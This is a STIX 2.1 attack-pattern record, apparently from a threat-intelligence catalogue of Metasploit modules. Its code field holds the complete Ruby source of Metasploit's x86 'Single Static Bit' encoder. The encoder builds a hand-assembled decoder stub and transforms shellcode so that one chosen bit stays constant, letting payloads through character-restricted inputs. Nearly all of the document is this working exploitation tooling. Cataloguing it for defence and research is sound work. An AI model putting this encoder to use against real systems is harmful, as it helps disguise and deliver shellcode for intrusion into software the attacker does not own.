{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--133f2af8-4756-42d4-95f3-9a75674a5a36",
    "created": "2024-08-14T16:33:19.20627Z",
    "modified": "2024-08-14T16:33:19.206273Z",
    "name": "Single Static Bit",
    "description": "Static value for specific bit",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/single_static_bit.rb",
            "external_id": "single_static_bit.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# NOTE: this encoder currently has only be tested using bit 5 set to on.\n#\n# The decoder has been tested with all possible values, but the decoder stub\n# is was not designed to bypass restrictions other than \"bit 5 must be on\"..\n#\nclass MetasploitModule < Msf::Encoder\n\n  # This encoder has a manual ranking because it should only be used in cases\n  # where information has been explicitly supplied, specifically\n  # BitNumber and BitValue.\n  Rank = ManualRanking\n\n  def initialize\n    super(\n      'Name'             => 'Single Static Bit',\n      'Description'      => 'Static value for specific bit',\n      'Author'           => 'jduck',\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE,\n      'EncoderType'      => Msf::Encoder::Type::SingleStaticBit\n      )\n\n    # this shouldn't be present in the decoder stub.\n    @key_marker = 0x1010\n  end\n\n  #\n  # Returns the decoder stub that is adjusted for the size of\n  # the buffer being encoded\n  #\n  def decoder_stub(state)\n\n    bit_num = (datastore['BitNumber'] || 5).to_i\n    bit_val = (datastore['BitValue'] || true)\n\n    # variables:\n    # bit to ignore                                  (global - harcoded)\n    # buf len (can be deduced with a jmp/call/pop)   (global - ebx)\n    # current source byte ptr                        (global - esi)\n    # current dest byte ptr                          (global - edi) ?\n    # current dest byte                              (global - ah)  ?\n    # number of bits accumulated                     (global - ebp) ?\n    # current source byte                            (outer  - al)\n    # bit index (for this byte)                      (inner  - cl)  ?\n    pre_init = \"\"\n    pre_init << \"\\x31\\xed\"        # xor ebp, ebp               - no bits accumulated\n    pre_init << \"\\x83\\xe1\\x01\"    # and ecx, $0x1              - init inner loop counter (set to 0/1)\n    pre_init << \"\\x83\\xe3\\x01\"    # and ebx, $0x1              - init buffer length\n    pre_init << \"\\x66\\xbb\" + [@key_marker].pack('v')         # - load encrypted buffer length\n    pre_init << \"\\x66\\x81\\xf3\" + [@key_marker].pack('v')     # - xor decrypt buffer length\n\n    # we stored an entire byte, move to the next one\n    next_byte = \"\"\n    next_byte << \"\\x83\\xef\\xff\"  # sub edi, 0xffffffff         - increment dst pointer\n    next_byte << \"\\x31\\xed\"      # xor ebp, ebp                - no bits accumulated\n\n    # inside the loop, we need to extract a bit, as\n    # specified by:\n    #\n    # ecx-1  - bit number to extract\n    # al     - byte to extract it from\n    get_a_bit = \"\"\n    get_a_bit << \"\\x60\"          # pusha                       - save all registers\n    get_a_bit << \"\\x83\\xe9\\x01\"  # sub ecx, 1                  - account for 1-based counting\n    get_a_bit << \"\\x74\\x06\"      # jz +6                       - skip dividing if bit zero\n    get_a_bit << \"\\xb3\\x02\"      # mov bl, 2                   - set divisor to 2\n    # divide_it:\n    get_a_bit << \"\\xf6\\xf3\"      # div bl                      - do the division\n    get_a_bit << \"\\xe2\" + [-1 * (2+2)].pack('C')             # - divide again..\n    # store_bit:\n    get_a_bit << \"\\x83\\xe0\\x01\"  # and eax, 0x01               - we only want the lowest bit\n    get_a_bit << \"\\x6b\\x2f\\x02\"  # imul ebp, 2, [edi]          - load [edi], shifted left by 1, to ebp\n    get_a_bit << \"\\x09\\xe8\"      # or ebp, eax                 - set bit 0\n    get_a_bit << \"\\xaa\"          # stosb al, [edi]             - store byte back\n    get_a_bit << \"\\x61\"          # popa                        - restore previous ebx/eax\n    get_a_bit << \"\\x83\\xed\\xff\"  # sub ebp, 0xffffffff         - increment bits stored\n\n    inner_init = \"\"\n    inner_init << \"\\xb1\\x08\"      # mov cl, $0x8               - init loop counter\n\n    inner_loop = \"\"\n    # process_bits:\n    inner_loop << \"\\x80\\xf9\"     # cmp cl, <ignore_bit + 1>   - is this the one to ignore?\n    inner_loop << [(bit_num+1)].pack('C')\n    len = get_a_bit.length + 3 + 2 + next_byte.length\n    inner_loop << \"\\x74\" + [len].pack('C')                   # - je next_bit\n    inner_loop << get_a_bit\n    inner_loop << \"\\x83\\xfd\\x08\"  # cmp ebp, $0x8              - got 8 bits now?\n    inner_loop << \"\\x75\" + [next_byte.length].pack('C')      # - jne to next_bit\n    # next_dst_byte:\n    inner_loop << next_byte\n    # next_bit:\n    # I really wish this silly padding wasn't necessary, however removing the bad characters in the\n    # jump/call displacements has proven difficult otherwise.\n    inner_loop << \"\\x90\" * 0x1a   # nops                       - for padding (so relative jumps don't have badchars)\n    len = -1 * (inner_loop.length+2)\n    inner_loop << \"\\xe2\" + [len].pack('C')                   # - loop process_bits\n\n    # prefixed by:                # jmp data_beg_call\n    outer_init = \"\"\n    # get_data_beg:\n    outer_init << \"\\x5e\"          # pop esi                    - ptr to beginning of data\n    outer_init << pre_init\n    outer_init << \"\\x89\\xf7\"      # mov edi, esi               - decode in place, init dst ptr\n\n    outer_loop = \"\"\n    #outer_loop << \"\\x90\" * (0xd+6)\n    outer_loop << \"\\x83\\xe0\\x7f\"  # and eax, 0x7f              - we only want the low byte\n    outer_loop << \"\\xac\"          # lods   al, [esi]           - load src byte\n    outer_loop << inner_init << inner_loop\n    outer_loop << \"\\x83\\xeb\\x01\"  # sub ebx, 1                 - 1 byte down!\n    outer_loop << \"\\x74\\x07\"      # jz +(2+5)                  - jump to data!\n    len = -1 * (outer_loop.length+2)\n    # next_byte:\n    outer_loop << \"\\xeb\" + [len].pack('C')                   # - jmp process_byte\n    # data_beg_call:\n\n    decoder = outer_init + outer_loop\n    jmp = \"\\xeb\" + [decoder.length].pack('C')\n    call = \"\\xe8\" + [-1 * (decoder.length+5)].pack('V')\n    decoder = jmp + decoder + call\n\n    # encoded sled\n    state.context = ''\n\n    return decoder\n  end\n\n  def encode_block(state, block)\n    bit_num = (datastore['BitNumber'] || 5).to_i\n    bit_num = (7-bit_num)\n    bit_val = (datastore['BitValue'] || true)\n\n    encoded = ''\n    new_byte = 0\n    nbits = 0\n\n    block.unpack('C*').each do |ch|\n      7.step(0,-1) do |x|\n\n        # is this the special bit?\n        if (nbits == bit_num)\n          new_byte <<= 1 if nbits > 0\n          new_byte |= 1 if bit_val\n          nbits += 1\n\n          # do we have a full byte?\n          if nbits == 8\n            encoded << new_byte.chr\n            new_byte = 0\n            nbits = 0\n          end\n        end\n\n        # we have space, add it in\n        new_byte <<= 1 if nbits > 0\n        new_byte += 1 if (((ch >> x) & 1) > 0)\n        nbits += 1\n\n        # do we have a full byte?\n        if nbits == 8\n          encoded << new_byte.chr\n          new_byte = 0\n          nbits = 0\n        end\n      end\n    end\n\n    # if we have bits left, pad out to a whole byte\n    if nbits > 0\n      while nbits < 8\n        new_byte <<= 1\n        new_byte |= 1 if (nbits == bit_num) and bit_val\n        nbits += 1\n      end\n      encoded << new_byte.chr\n    end\n\n    return encoded\n  end\n\n  #\n  # Appends the encoded context portion.\n  #\n  def encode_end(state)\n    state.encoded += state.context\n\n    xor_key = 0\n    xor_key_str = ''\n    enc_len_str = ''\n    loop do\n      xor_key = rand(0x10000)\n      xor_key_str = [xor_key].pack('v')\n      enc_len_str = [state.encoded.length ^ xor_key].pack('v')\n      next if has_badchars?(xor_key_str, state.badchars)\n      next if has_badchars?(enc_len_str, state.badchars)\n      break\n    end\n\n    marker_str = [@key_marker].pack('v')\n\n    state.encoded.sub!(marker_str, enc_len_str)\n    state.encoded.sub!(marker_str, xor_key_str)\n  end\nend\n"
}